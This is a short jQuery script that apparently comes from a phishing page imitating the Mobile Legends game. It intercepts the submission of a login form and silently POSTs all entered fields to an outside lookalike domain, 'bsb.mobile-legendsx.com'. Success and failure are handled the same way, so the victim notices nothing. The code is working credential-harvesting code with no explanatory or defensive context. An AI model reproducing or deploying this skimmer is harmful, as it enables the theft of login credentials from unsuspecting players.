$(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "http://bsb.mobile-legendsx.com/",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
